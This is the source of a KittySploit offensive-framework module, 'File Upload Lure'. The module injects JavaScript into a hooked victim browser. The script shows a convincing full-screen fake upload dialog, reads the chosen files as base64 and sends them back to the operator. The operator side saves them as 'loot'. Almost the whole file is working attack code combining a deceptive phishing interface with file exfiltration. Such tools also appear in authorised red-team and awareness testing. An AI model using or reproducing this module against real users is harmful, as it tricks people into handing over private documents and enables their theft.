from kittysploit import *
import base64
import json
import os
import time


class Module(BrowserAuxiliary):

	__info__ = {
		"name": "File Upload Lure",
		"description": "Show a fake file-attach modal and exfiltrate selected file metadata and content",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}

	title = OptString("Upload required document", "Modal title", False)
	message = OptString(
		"Please attach the requested file to continue.",
		"Modal body text",
		False,
	)
	accept = OptString(
		"*/*",
		"input[accept] filter (e.g. .pdf,.doc,image/*,*/*)",
		False,
	)
	max_bytes = OptInteger(
		1048576,
		"Max file bytes to read into memory (larger files return metadata only)",
		False,
	)
	timeout = OptInteger(60, "Seconds to wait for file selection", False)
	save_files = OptBool(True, "Save captured files under data/loot/browser_files", False)
	multiple = OptBool(False, "Allow multiple file selection", False)

	def _loot_dir(self) -> str:
		base = os.path.join("data", "loot", "browser_files")
		os.makedirs(base, exist_ok=True)
		return base

	def run(self):
		title = str(self.title or "Upload required document")
		message = str(self.message or "Please attach the requested file to continue.")
		accept = str(self.accept or "*/*")
		max_bytes = max(1024, int(self.max_bytes or 1048576))
		timeout_s = max(5, int(self.timeout or 60))
		save_files = self._to_bool(self.save_files)
		multiple = self._to_bool(self.multiple)

		code_js = f"""
		(function() {{
			const TITLE = {json.dumps(title)};
			const MESSAGE = {json.dumps(message)};
			const ACCEPT = {json.dumps(accept)};
			const MAX_BYTES = {max_bytes};
			const TIMEOUT_MS = {timeout_s * 1000};
			const MULTIPLE = {str(multiple).lower()};

			const existing = document.getElementById('ks-file-lure');
			if (existing) existing.remove();

			function readFile(file) {{
				return new Promise(function(resolve) {{
					const meta = {{
						name: file.name,
						size: file.size,
						type: file.type || 'application/octet-stream',
						lastModified: file.lastModified || null
					}};
					if (file.size > MAX_BYTES) {{
						meta.content_b64 = null;
						meta.truncated = true;
						meta.note = 'File exceeds max_bytes; metadata only';
						resolve(meta);
						return;
					}}
					const reader = new FileReader();
					reader.onload = function() {{
						const result = String(reader.result || '');
						const idx = result.indexOf(',');
						meta.content_b64 = idx >= 0 ? result.slice(idx + 1) : result;
						meta.truncated = false;
						resolve(meta);
					}};
					reader.onerror = function() {{
						meta.content_b64 = null;
						meta.error = 'FileReader failed';
						resolve(meta);
					}};
					reader.readAsDataURL(file);
				}});
			}}

			return new Promise(function(resolve) {{
				let finished = false;
				function done(payload) {{
					if (finished) return;
					finished = true;
					try {{ root.remove(); }} catch (e) {{}}
					resolve(JSON.stringify(payload));
				}}

				const root = document.createElement('div');
				root.id = 'ks-file-lure';
				root.style.cssText = 'position:fixed;inset:0;z-index:2147483647;background:rgba(15,23,42,.6);display:flex;align-items:center;justify-content:center;font-family:system-ui,sans-serif;backdrop-filter:blur(3px);';

				const card = document.createElement('div');
				card.style.cssText = 'width:min(420px,92vw);background:#fff;color:#0f172a;border-radius:14px;padding:26px;box-shadow:0 25px 50px rgba(0,0,0,.35);';

				const h = document.createElement('div');
				h.style.cssText = 'font-size:20px;font-weight:700;margin-bottom:8px;';
				h.textContent = TITLE;

				const p = document.createElement('p');
				p.style.cssText = 'margin:0 0 16px;color:#64748b;font-size:14px;line-height:1.45;';
				p.textContent = MESSAGE;

				const input = document.createElement('input');
				input.type = 'file';
				input.accept = ACCEPT;
				if (MULTIPLE) input.multiple = true;
				input.style.cssText = 'display:block;width:100%;margin-bottom:14px;';

				const status = document.createElement('div');
				status.style.cssText = 'font-size:12px;color:#64748b;min-height:16px;margin-bottom:10px;';

				const row = document.createElement('div');
				row.style.cssText = 'display:flex;gap:8px;justify-content:flex-end;';

				const cancel = document.createElement('button');
				cancel.type = 'button';
				cancel.textContent = 'Cancel';
				cancel.style.cssText = 'padding:10px 14px;border-radius:8px;border:1px solid #e2e8f0;background:#fff;cursor:pointer;';
				cancel.onclick = function() {{
					done({{ ok: true, submitted: false, dismissed: true, page_url: location.href }});
				}};

				const submit = document.createElement('button');
				submit.type = 'button';
				submit.textContent = 'Upload';
				submit.style.cssText = 'padding:10px 14px;border-radius:8px;border:0;background:#2563eb;color:#fff;font-weight:600;cursor:pointer;';
				submit.onclick = function() {{
					const files = Array.from(input.files || []);
					if (!files.length) {{
						status.textContent = 'Please choose a file first.';
						return;
					}}
					status.textContent = 'Uploading…';
					submit.disabled = true;
					Promise.all(files.map(readFile)).then(function(items) {{
						done({{
							ok: true,
							submitted: true,
							page_url: location.href,
							origin: location.origin,
							files: items,
							count: items.length
						}});
					}});
				}};

				row.appendChild(cancel);
				row.appendChild(submit);
				card.appendChild(h);
				card.appendChild(p);
				card.appendChild(input);
				card.appendChild(status);
				card.appendChild(row);
				root.appendChild(card);
				document.documentElement.appendChild(root);

				setTimeout(function() {{
					done({{ ok: true, submitted: false, timeout: true, page_url: location.href }});
				}}, TIMEOUT_MS);
			}});
		}})();
		"""

		print_status(f"Showing file lure (wait up to {timeout_s}s)...")
		result = self.send_js_and_wait_for_response(code_js, timeout=float(timeout_s + 20))
		if not result:
			print_error("Failed to run file lure")
			return False
		if isinstance(result, str) and result.startswith("Error:"):
			print_error(result)
			return False

		try:
			data = json.loads(result)
		except json.JSONDecodeError as exc:
			print_error(f"Failed to parse response: {exc}")
			return False

		print_info("=" * 60)
		print_info("File Upload Lure")
		print_info(f"  Page: {data.get('page_url')}")

		if not data.get("submitted"):
			if data.get("dismissed"):
				print_status("User cancelled")
			elif data.get("timeout"):
				print_status("Timed out waiting for file")
			return True

		files = data.get("files") or []
		print_success(f"Captured {len(files)} file(s)")
		loot_dir = self._loot_dir() if save_files else None
		stamp = time.strftime("%Y%m%d_%H%M%S")
		sid = str(self.session_id or "unknown")[:8]

		for idx, item in enumerate(files):
			print_warning(
				f"  [{idx}] {item.get('name')}  "
				f"{item.get('size')} bytes  type={item.get('type')}"
			)
			if item.get("truncated") or item.get("note"):
				print_info(f"      {item.get('note') or 'truncated / metadata only'}")
			b64 = item.get("content_b64")
			if save_files and b64 and loot_dir:
				safe_name = "".join(
					c if c.isalnum() or c in "._-" else "_"
					for c in str(item.get("name") or f"file_{idx}")
				)
				path = os.path.join(loot_dir, f"{stamp}_{sid}_{idx}_{safe_name}")
				try:
					with open(path, "wb") as fh:
						fh.write(base64.b64decode(b64))
					print_success(f"      saved: {path}")
				except Exception as exc:
					print_error(f"      save failed: {exc}")

		return True
